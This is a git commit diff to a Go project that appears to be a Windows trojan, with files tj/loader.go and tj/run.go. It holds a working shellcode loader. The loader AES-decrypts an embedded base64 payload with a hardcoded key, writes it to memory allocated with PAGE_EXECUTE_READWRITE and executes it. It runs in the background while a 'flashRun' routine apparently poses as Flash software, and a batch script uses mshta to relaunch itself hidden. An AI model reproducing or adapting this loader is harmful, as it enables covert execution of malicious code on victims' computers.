53827e5d234da180e2a96014cffcc0ca0409542d
ha1yu <luckyhaizzz@gmail.com>
2022-04-17 16:50:29 +0800

    update

--- tj/loader.go
+++ tj/loader.go
@@ -5,7 +5,6 @@ import (
 	"crypto/cipher"
 	"encoding/base64"
 	"fmt"
-	"github.com/ha1yu/win-tj-free/utils"
 	"log"
 	"unsafe"
 
@@ -60,27 +59,16 @@ var (
 	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
 )
 
-func loaderRun() {
-	utils.Gotest01()
-	shellcodeAesBast64 := "OPQI9JGoMh9g/LTZ9ShH2jXalCpYJxoViYIYgOLN7jUlyqxZK1yGb/tm8dSfkpfAoGmc7Btms/519YS5CquBCebtM76wUS8ahc6hL2lQsxLJnZvIDCnply6UEzv4uaD6lmJapOFSaiTrftm4euGllupnGdqevihQPM34U6Q5tGul0u5O0NVu6iAw+UXAgCFTlGFG68mS4L/moRbHOHkoLccG3t41dyQRQ0xKX+oEO/w6v28I9cIFb26hrj3T5pAST8ZYvNjfLLFhYanGnKZbv9vFSA79iP8asxRVMUS/qdO+Wbnq72CMmDjjCghpeblA8XVRmExNUm4YN7Q9GOp5BMCFkXRERMWoBZks6rZIJKph/Ll089kMCvNmuCkKbmXfQ2nrUUcngeGOqMZ7/4lrxex0xnlzTV+t0upALOISlnSo0QIFJDauXoOcMEM2Uf5UYp75SrOfi3254SsAT74r2ytAxf/gmmTSxG8EPLh1foqiF2TxJHI8DvG6VWrgn25oedUqiz3v3HZc52RcGSpU7fYVQ7NuaevdE9CfKxkQVJorpSR68wkQMcLmr+itKVZne6CGkSVef7c6kZlCXeqqtrcVg76wNM96XtqiAlhuONnhUxJgCjfK8Cc1eSMd+fqcG25VPSbAnmlw2QDAB7rdCo3fgi6qnRrVdnLoEMgsBsNdWoO42fmnNW5ecPI5xnte5y98KY1SWGXyXUpuDikqzngQcTToETVNRvxpkCl6xBhUXkV3N5wxgJ5vMV44RFhoIW077bzJhircsS1w79TSvyIG3iKoqyZeEXreQuInT9O8I7xnN7V3PDHjgpxw3ij6uPvLVUuqMxM18FRE9i4LfszEHEI+OqgdeasRihvaThFVIhESALru/AVEgZIZhsqKZb8G7+a/ejW3xsn76uUg5L5RcA0WEfvbOuxdN7ikbuMzWBzjcHmsFQaEAInNjMSgGwqoEquH4Rb9z78x3UdE9fj7r9BkmvqPvh+nogbHaxF/uRE3BFZgUx35E/Osr5gIpvCWnp8qqCb26D8h0jvYvaR070VDyxbSbWYX13um/7hExCrtuKGGSJtr2SYG0u2D9PuaA5d9Uz13GLnudU2MZX6ea8jbBr3hoz+bqBhApA5JBWfcNj3LUokSlPkcogyjr6YBpBd2Cp7liUsIPV21JZbfKpv2kQwsrGYR8reDkVCbLz8saaaJrx+y328bNLUt+qEMfNVCZihOqSYZx4HL6g=="
+func loaderRun(key string, shellCodeAesBast64 string) {
 
-	shellcode, _ := AesDecrypt(shellcodeAesBast64, []byte("woshikeywoshikey"))
+	shellcode, _ := AesDecrypt(shellcodeAesBast64, []byte(key))
 	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
 	if err != nil {
 		log.Println(err)
-		//syscall.Exit(0)
 	}
-	//if err != nil && err.Error() != "The operation completed successfully." {
-	//	syscall.Exit(0)
-	//}
 	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
-	//if err != nil && err.Error() != "The operation completed successfully." {
-	//	syscall.Exit(0)
-	//}
 	if err != nil {
 		log.Println(err)
-		//syscall.Exit(0)
 	}
-
 	syscall.Syscall(addr, 0, 0, 0, 0)
 }
--- tj/run.go
+++ tj/run.go
@@ -15,13 +15,17 @@ var embededFiles embed.FS
 var windowsScript = `
 @echo off
 %1 mshta vbscript:CreateObject("WScript.Shell").Run("%~s0 ::",0,FALSE)(window.close)&&exit
-%v
+%s
 `
 
 func TjRun() {
-	go loaderRun()
+
+	key := "woshikeywoshikey"
+	shellCodeAesBast64 := "OPQI9JGoMh9g/LTZ9ShH2jXalCpYJxoViYIYgOLN7jUlyqxZK1yGb/tm8dSfkpfAoGmc7Btms/519YS5CquBCebtM76wUS8ahc6hL2lQsxLJnZvIDCnply6UEzv4uaD6lmJapOFSaiTrftm4euGllupnGdqevihQPM34U6Q5tGul0u5O0NVu6iAw+UXAgCFTlGFG68mS4L/moRbHOHkoLccG3t41dyQRQ0xKX+oEO/w6v28I9cIFb26hrj3T5pAST8ZYvNjfLLFhYanGnKZbv9vFSA79iP8asxRVMUS/qdO+Wbnq72CMmDjjCghpeblA8XVRmExNUm4YN7Q9GOp5BMCFkXRERMWoBZks6rZIJKph/Ll089kMCvNmuCkKbmXfQ2nrUUcngeGOqMZ7/4lrxex0xnlzTV+t0upALOISlnSo0QIFJDauXoOcMEM2Uf5UYp75SrOfi3254SsAT74r2ytAxf/gmmTSxG8EPLh1foqiF2TxJHI8DvG6VWrgn25oedUqiz3v3HZc52RcGSpU7fYVQ7NuaevdE9CfKxkQVJorpSR68wkQMcLmr+itKVZne6CGkSVef7c6kZlCXeqqtrcVg76wNM96XtqiAlhuONnhUxJgCjfK8Cc1eSMd+fqcG25VPSbAnmlw2QDAB7rdCo3fgi6qnRrVdnLoEMgsBsNdWoO42fmnNW5ecPI5xnte5y98KY1SWGXyXUpuDikqzngQcTToETVNRvxpkCl6xBhUXkV3N5wxgJ5vMV44RFhoIW077bzJhircsS1w79TSvyIG3iKoqyZeEXreQuInT9O8I7xnN7V3PDHjgpxw3ij6uPvLVUuqMxM18FRE9i4LfszEHEI+OqgdeasRihvaThFVIhESALru/AVEgZIZhsqKZb8G7+a/ejW3xsn76uUg5L5RcA0WEfvbOuxdN7ikbuMzWBzjcHmsFQaEAInNjMSgGwqoEquH4Rb9z78x3UdE9fj7r9BkmvqPvh+nogbHaxF/uRE3BFZgUx35E/Osr5gIpvCWnp8qqCb26D8h0jvYvaR070VDyxbSbWYX13um/7hExCrtuKGGSJtr2SYG0u2D9PuaA5d9Uz13GLnudU2MZX6ea8jbBr3hoz+bqBhApA5JBWfcNj3LUokSlPkcogyjr6YBpBd2Cp7liUsIPV21JZbfKpv2kQwsrGYR8reDkVCbLz8saaaJrx+y328bNLUt+qEMfNVCZihOqSYZx4HL6g=="
+
+	go loaderRun(key, shellCodeAesBast64)
 	flashRun()
-	time.Sleep(9999999999999999)
+	time.Sleep(999999999)
 }
 
 func flashRun() {
